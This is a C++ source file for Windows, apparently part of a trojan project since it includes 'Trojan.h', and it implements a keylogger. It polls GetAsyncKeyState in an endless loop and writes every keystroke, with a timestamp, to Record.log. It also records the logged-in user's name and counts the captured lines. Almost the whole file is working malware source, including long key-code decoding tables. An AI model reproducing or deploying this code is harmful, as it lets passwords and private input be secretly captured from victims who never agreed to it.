/*
#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <string>
#include <ifstream>
#define FILE_NAME "Record.log"
#define MIN_RECORD_SIZE 25
*/
#include "Trojan.h"
using namespace std;

void logKey();  //记录键盘 
char* decode(int); // 解密键码 
char* decodeCaps(int); //大写键码 
void logUserTime();  //时间戳 
bool checkRecordSize();  //检验文件的行数 
int KeyLog();

void logKey(){
    FILE *file;
    unsigned short ch=0, i=0, j=500; // :)
	
    while(1){ ///loop runs for approx. 25 seconds
        ch=1;
        time_t date = time(NULL);
        while(ch<250){
            for(i=0; i<50; i++, ch++){
                if(GetAsyncKeyState(ch) == -32767){ ///key is stroke
                    file=fopen(FILE_NAME, "a+");
                    if(GetKeyState(VK_CAPITAL)  == 1){
                    	fprintf(file, "%s => %s\r\n", decodeCaps((int)ch), ctime(&date));
					}else{
						fprintf(file, "%s => %s\r\n", decode((int)ch), ctime(&date));
					}
                    fclose(file);
                }
            }
            Sleep(1); ///take rest
        }
        //j++;
    }
}

void logUserTime(){
	FILE* file = fopen(FILE_NAME, "a");
	if(!file){
		printf("Open file failed!\n");
		exit(-1);
	}
	
	char username[20]={0, };
	unsigned long username_length = 20;
	GetUserName(username, &username_length);
	time_t date = time(NULL);
	fprintf(file, "\r\n----------------------------------------------\r\n%s->%s", username, ctime(&date));
	
	fclose(file);
}

bool checkRecordSize(){
	string line;
	ifstream myfile(FILE_NAME);
	
	int numberOfLines = 0;
	if(myfile.is_open()){
		while(getline(myfile, line)){
			numberOfLines++;
		}
		myfile.close();
	}
	
	if(numberOfLines < MIN_RECORD_SIZE){
		return false;
	}else{
		return true;
	}
}

char* decode(int i){
	char* ch;
	
	switch(i){
    case 1:
        ch="[LC]";
        break;
    case 2:
        ch="[RC]";
        break;
    case 8:
        ch="[<B]";
        break;
    case 9:
        ch="[TAB]";
        break;
    case 13:
        ch="\n";
        break;
    case 16:
        ch="[SH]";
        break;
    case 17:
        ch="[CTR]";
        break;
    case 18:
        ch="[ALT]";
        break;
    case 19:
        ch="[PAUSE]";
        ch="";
        break;
    case 20:
        ch="[CAP]";
        break;
    case 27:
        ch="[ESC]";
        break;
    case 32:
        ch=" ";
        break;
    case 33:
        ch="[PgUp]";
        break;
    case 34:
        ch="[PgDn]";
        break;
    /*
    case 37:
        ch="";
        break;
    case 38:
        ch="";
        break;
    case 39:
        ch="";
        break;
    case 40:
        ch="";
        break;
    case 41:
        ch="";
        break;
    case 42:
        ch="";
        break;
    case 43:
        ch="";
        break;
    case 44:
        ch="";
        break;
        */
    case 45:
        ch="[INS]";
        break;
	case 46:
        ch="[DEL]";
        break;
	case 47:
        ch="/";
        break;
	case 48:
        ch="0";
        break;
	case 49:
        ch="1";
        break;
	case 50:
        ch="2";
        break;
	case 51:
        ch="3";
        break;
	case 52:
        ch="4";
        break;
	case 53:
        ch="5";
        break;
	case 54:
        ch="6";
        break;
	case 55:
        ch="7";
        break;
	case 56:
        ch="8";
        break;
	case 57:
        ch="9";
        break;
	case 65:
        ch="a";
        break;
	case 66:
        ch="b";
        break;
	case 67:
        ch="c";
        break;
	case 68:
        ch="d";
        break;
	case 69:
        ch="e";
        break;
	case 70:
        ch="f";
        break;
	case 71:
        ch="g";
        break;
	case 72:
        ch="h";
        break;
	case 73:
        ch="i";
        break;
	case 74:
        ch="j";
        break;
	case 75:
        ch="k";
        break;
	case 76:
        ch="l";
        break;
	case 77:
        ch="m";
        break;
	case 78:
        ch="n";
        break;
	case 79:
        ch="o";
        break;
	case 80:
        ch="p";
        break;
	case 81:
        ch="q";
        break;
	case 82:
        ch="r";
        break;
	case 83:
        ch="s";
        break;
	case 84:
        ch="t";
        break;
	case 85:
        ch="u";
        break;
	case 86:
        ch="v";
        break;
	case 87:
        ch="w";
        break;
	case 88:
        ch="x";
        break;
	case 89:
        ch="y";
        break;
	case 90:
        ch="z";
        break;
	case 91:
        ch="[STRT]";
        break;
	case 92:
        ch="\\";
        break;
	case 93:
        ch="[MNU]";
        break;
	case 96:
        ch="0";
        break;
	case 97:
        ch="1";
        break;
	case 98:
        ch="2";
        break;
	case 99:
        ch="3";
        break;
	case 100:
        ch="4";
        break;
	case 101:
        ch="5";
        break;
	case 102:
        ch="6";
        break;
	case 103:
        ch="7";
        break;
	case 104:
        ch="8";
        break;
	case 105:
        ch="9";
        break;
	case 106:
        ch="*";
        break;
	case 107:
        ch="+";
        break;
	case 109:
        ch="-";
        break;
	case 110:
        ch=".";
        break;
	case 111:
        ch="/";
        break;
	case 112:
        ch="[f1]";
        break;
	case 113:
        ch="[f2]";
        break;
	case 114:
        ch="[f3]";
        break;
	case 115:
        ch="[f4]";
        break;
	case 116:
        ch="[f5]";
        break;
	case 117:
        ch="[f6]";
        break;
	case 118:
        ch="[f7]";
        break;
	case 119:
        ch="[f8]";
        break;
	case 120:
        ch="[f9]";
        break;
	case 121:
        ch="[f10]";
        break;
	case 122:
        ch="[f11]";
        break;
	case 123:
        ch="[f12]";
        break;
	case 124:
        ch="|";
        break;
	case 144:
        ch="[NUM]";
        break;
    case 150:
        ch="-";
        break;
    /*
    case 151:
        ch="";
        break;
    case 152:
        ch="";
        break;
    case 153:
        ch="";
        break;
    case 154:
        ch="";
        break;
    case 155:
        ch="";
        break;
    case 156:
        ch="";
        break;
    case 157:
        ch="";
        break;
    case 158:
        ch="";
        break;
    case 159:
        ch="";
        break;
    case 160:
        ch="";
        break;
    case 161:
        ch="";
        break;
    case 162:
        ch="";  //[CTR]
        break;
    case 163:
        ch="";  //[CTR]
        break;
    case 164:
        ch="";  //[ALT]
        break;
    case 165:
        ch="";  //[ALT]
        break;
    case 166:
        ch="";
        break;
    case 167:
        ch="";
        break;
    case 168:
        ch="";
        break;
    case 169:
        ch="";
        break;
    case 170:
        ch="";
        break;
    case 171:
        ch="";
        break;
    case 172:
        ch="";
        break;
    case 173:
        ch="";
        break;
    case 174:
        ch="";
        break;
    case 175:
        ch="";
        break;
    case 176:
        ch="";
        break;
    case 177:
        ch="";
        break;
    case 178:
        ch="";
        break;
    case 179:
        ch="";
        break;
    case 180:
        ch="";
        break;
    case 181:
        ch="";
        break;
    case 182:
        ch="";
        break;
    case 183:
        ch="";
        break;
    case 184:
        ch="";
        break;
    case 185:
        ch="";
        break;
    */
    case 186:
        ch=";";
        break;
    case 187:
        ch="=";
        break;
    case 188:
        ch=",";
        break;
    case 189:
        ch="-";
        break;
    case 190:
        ch=".";
        break;
    case 191:
        ch="/";
        break;
    case 192:
        ch="`";
        break;
    /*
    case 193:
        ch="";
        break;
    case 194:
        ch="";
        break;
    case 195:
        ch="";
        break;
    case 196:
        ch="";
        break;
    case 197:
        ch="";
        break;
    case 198:
        ch="";
        break;
    case 199:
        ch="";
        break;
    case 200:
        ch="";
        break;
    case 201:
        ch="";
        break;
    case 202:
        ch="";
        break;
    case 203:
        ch="";
        break;
    case 204:
        ch="";
        break;
    case 205:
        ch="";
        break;
    case 206:
        ch="";
        break;
    case 207:
        ch="";
        break;
    case 208:
        ch="";
        break;
    case 209:
        ch="";
        break;
    case 210:
        ch="";
        break;
    case 211:
        ch="";
        break;
    case 212:
        ch="";
        break;
    case 213:
        ch="";
        break;
    case 214:
        ch="";
        break;
    case 215:
        ch="";
        break;
    case 216:
        ch="";
        break;
    case 217:
        ch="";
        break;
    case 218:
        ch="";
        break;
        */
    case 219:
        ch="[";
        break;
    case 220:
        ch="\\";
        break;
    case 221:
        ch="]";
        break;
    case 222:
        ch="'";
        break;
    /*
    case 223:
        ch="";
        break;
    case 224:
        ch="";
        break;
    case 225:
        ch="";
        break;
    case 226:
        ch="";
        break;
    case 227:
        ch="";
        break;
    case 228:
        ch="";
        break;
    case 229:
        ch="";
        break;
    case 230:
        ch="";
        break;
    case 231:
        ch="";
        break;
    case 232:
        ch="";
        break;
    case 233:
        ch="";
        break;
    case 234:
        ch="";
        break;
    case 235:
        ch="";
        break;
    case 236:
        ch="";
        break;
    case 237:
        ch="";
        break;
    case 238:
        ch="";
        break;
    case 239:
        ch="";
        break;
    case 240:
        ch="";
        break;
    case 241:
        ch="";
        break;
    case 242:
        ch="";
        break;
    case 243:
        ch="";
        break;
    case 244:
        ch="";
        break;
    case 245:
        ch="";
        break;
    case 246:
        ch="";
        break;
    case 247:
        ch="";
        break;
    case 248:
        ch="";
        break;
    case 249:
        ch="";
        break;
    case 250:
        ch="";
        break;
    */
    default:
        ch="[U?]";
    }

    return ch;
}

char* decodeCaps(int i){
	char* ch;
	
	switch(i){
    case 1:
        ch="[LC]";
        break;
    case 2:
        ch="[RC]";
        break;
    case 8:
        ch="[<B]";
        break;
    case 9:
        ch="[TAB]";
        break;
    case 13:
        ch="\n";
        break;
    case 16:
        ch="[SH]";
        break;
    case 17:
        ch="[CTR]";
        break;
    case 18:
        ch="[ALT]";
        break;
    case 19:
        ch="[PAUSE]";
        ch="";
        break;
    case 20:
        ch="[CAP]";
        break;
    case 27:
        ch="[ESC]";
        break;
    case 32:
        ch=" ";
        break;
    case 33:
        ch="[PgUp]";
        break;
    case 34:
        ch="[PgDn]";
        break;
    /*
    case 37:
        ch="";
        break;
    case 38:
        ch="";
        break;
    case 39:
        ch="";
        break;
    case 40:
        ch="";
        break;
    case 41:
        ch="";
        break;
    case 42:
        ch="";
        break;
    case 43:
        ch="";
        break;
    case 44:
        ch="";
        break;
        */
    case 45:
        ch="[INS]";
        break;
	case 46:
        ch="[DEL]";
        break;
	case 47:
        ch="/";
        break;
	case 48:
        ch="0";
        break;
	case 49:
        ch="1";
        break;
	case 50:
        ch="2";
        break;
	case 51:
        ch="3";
        break;
	case 52:
        ch="4";
        break;
	case 53:
        ch="5";
        break;
	case 54:
        ch="6";
        break;
	case 55:
        ch="7";
        break;
	case 56:
        ch="8";
        break;
	case 57:
        ch="9";
        break;
	case 65:
        ch="A";
        break;
	case 66:
        ch="B";
        break;
	case 67:
        ch="C";
        break;
	case 68:
        ch="D";
        break;
	case 69:
        ch="E";
        break;
	case 70:
        ch="F";
        break;
	case 71:
        ch="G";
        break;
	case 72:
        ch="H";
        break;
	case 73:
        ch="I";
        break;
	case 74:
        ch="J";
        break;
	case 75:
        ch="K";
        break;
	case 76:
        ch="L";
        break;
	case 77:
        ch="M";
        break;
	case 78:
        ch="N";
        break;
	case 79:
        ch="O";
        break;
	case 80:
        ch="P";
        break;
	case 81:
        ch="Q";
        break;
	case 82:
        ch="R";
        break;
	case 83:
        ch="S";
        break;
	case 84:
        ch="T";
        break;
	case 85:
        ch="U";
        break;
	case 86:
        ch="V";
        break;
	case 87:
        ch="W";
        break;
	case 88:
        ch="X";
        break;
	case 89:
        ch="Y";
        break;
	case 90:
        ch="Z";
        break;
	case 91:
        ch="[STRT]";
        break;
	case 92:
        ch="\\";
        break;
	case 93:
        ch="[MNU]";
        break;
	case 96:
        ch="0";
        break;
	case 97:
        ch="1";
        break;
	case 98:
        ch="2";
        break;
	case 99:
        ch="3";
        break;
	case 100:
        ch="4";
        break;
	case 101:
        ch="5";
        break;
	case 102:
        ch="6";
        break;
	case 103:
        ch="7";
        break;
	case 104:
        ch="8";
        break;
	case 105:
        ch="9";
        break;
	case 106:
        ch="*";
        break;
	case 107:
        ch="+";
        break;
	case 109:
        ch="-";
        break;
	case 110:
        ch=".";
        break;
	case 111:
        ch="/";
        break;
	case 112:
        ch="[f1]";
        break;
	case 113:
        ch="[f2]";
        break;
	case 114:
        ch="[f3]";
        break;
	case 115:
        ch="[f4]";
        break;
	case 116:
        ch="[f5]";
        break;
	case 117:
        ch="[f6]";
        break;
	case 118:
        ch="[f7]";
        break;
	case 119:
        ch="[f8]";
        break;
	case 120:
        ch="[f9]";
        break;
	case 121:
        ch="[f10]";
        break;
	case 122:
        ch="[f11]";
        break;
	case 123:
        ch="[f12]";
        break;
	case 124:
        ch="|";
        break;
	case 144:
        ch="[NUM]";
        break;
    case 150:
        ch="-";
        break;
    /*
    case 151:
        ch="";
        break;
    case 152:
        ch="";
        break;
    case 153:
        ch="";
        break;
    case 154:
        ch="";
        break;
    case 155:
        ch="";
        break;
    case 156:
        ch="";
        break;
    case 157:
        ch="";
        break;
    case 158:
        ch="";
        break;
    case 159:
        ch="";
        break;
    case 160:
        ch="";
        break;
    case 161:
        ch="";
        break;
    case 162:
        ch="";  //[CTR]
        break;
    case 163:
        ch="";  //[CTR]
        break;
    case 164:
        ch="";  //[ALT]
        break;
    case 165:
        ch="";  //[ALT]
        break;
    case 166:
        ch="";
        break;
    case 167:
        ch="";
        break;
    case 168:
        ch="";
        break;
    case 169:
        ch="";
        break;
    case 170:
        ch="";
        break;
    case 171:
        ch="";
        break;
    case 172:
        ch="";
        break;
    case 173:
        ch="";
        break;
    case 174:
        ch="";
        break;
    case 175:
        ch="";
        break;
    case 176:
        ch="";
        break;
    case 177:
        ch="";
        break;
    case 178:
        ch="";
        break;
    case 179:
        ch="";
        break;
    case 180:
        ch="";
        break;
    case 181:
        ch="";
        break;
    case 182:
        ch="";
        break;
    case 183:
        ch="";
        break;
    case 184:
        ch="";
        break;
    case 185:
        ch="";
        break;
    */
    case 186:
        ch=";";
        break;
    case 187:
        ch="=";
        break;
    case 188:
        ch=",";
        break;
    case 189:
        ch="-";
        break;
    case 190:
        ch=".";
        break;
    case 191:
        ch="/";
        break;
    case 192:
        ch="`";
        break;
    /*
    case 193:
        ch="";
        break;
    case 194:
        ch="";
        break;
    case 195:
        ch="";
        break;
    case 196:
        ch="";
        break;
    case 197:
        ch="";
        break;
    case 198:
        ch="";
        break;
    case 199:
        ch="";
        break;
    case 200:
        ch="";
        break;
    case 201:
        ch="";
        break;
    case 202:
        ch="";
        break;
    case 203:
        ch="";
        break;
    case 204:
        ch="";
        break;
    case 205:
        ch="";
        break;
    case 206:
        ch="";
        break;
    case 207:
        ch="";
        break;
    case 208:
        ch="";
        break;
    case 209:
        ch="";
        break;
    case 210:
        ch="";
        break;
    case 211:
        ch="";
        break;
    case 212:
        ch="";
        break;
    case 213:
        ch="";
        break;
    case 214:
        ch="";
        break;
    case 215:
        ch="";
        break;
    case 216:
        ch="";
        break;
    case 217:
        ch="";
        break;
    case 218:
        ch="";
        break;
        */
    case 219:
        ch="[";
        break;
    case 220:
        ch="\\";
        break;
    case 221:
        ch="]";
        break;
    case 222:
        ch="'";
        break;
    /*
    case 223:
        ch="";
        break;
    case 224:
        ch="";
        break;
    case 225:
        ch="";
        break;
    case 226:
        ch="";
        break;
    case 227:
        ch="";
        break;
    case 228:
        ch="";
        break;
    case 229:
        ch="";
        break;
    case 230:
        ch="";
        break;
    case 231:
        ch="";
        break;
    case 232:
        ch="";
        break;
    case 233:
        ch="";
        break;
    case 234:
        ch="";
        break;
    case 235:
        ch="";
        break;
    case 236:
        ch="";
        break;
    case 237:
        ch="";
        break;
    case 238:
        ch="";
        break;
    case 239:
        ch="";
        break;
    case 240:
        ch="";
        break;
    case 241:
        ch="";
        break;
    case 242:
        ch="";
        break;
    case 243:
        ch="";
        break;
    case 244:
        ch="";
        break;
    case 245:
        ch="";
        break;
    case 246:
        ch="";
        break;
    case 247:
        ch="";
        break;
    case 248:
        ch="";
        break;
    case 249:
        ch="";
        break;
    case 250:
        ch="";
        break;
    */
    default:
        ch="[U?]";
    }

    return ch;
}

int KeyLog(){
	printf("execute logKey()\n");
	logUserTime();
	printf("execute logUserTime()\n");
	logKey();
	return 0;
}













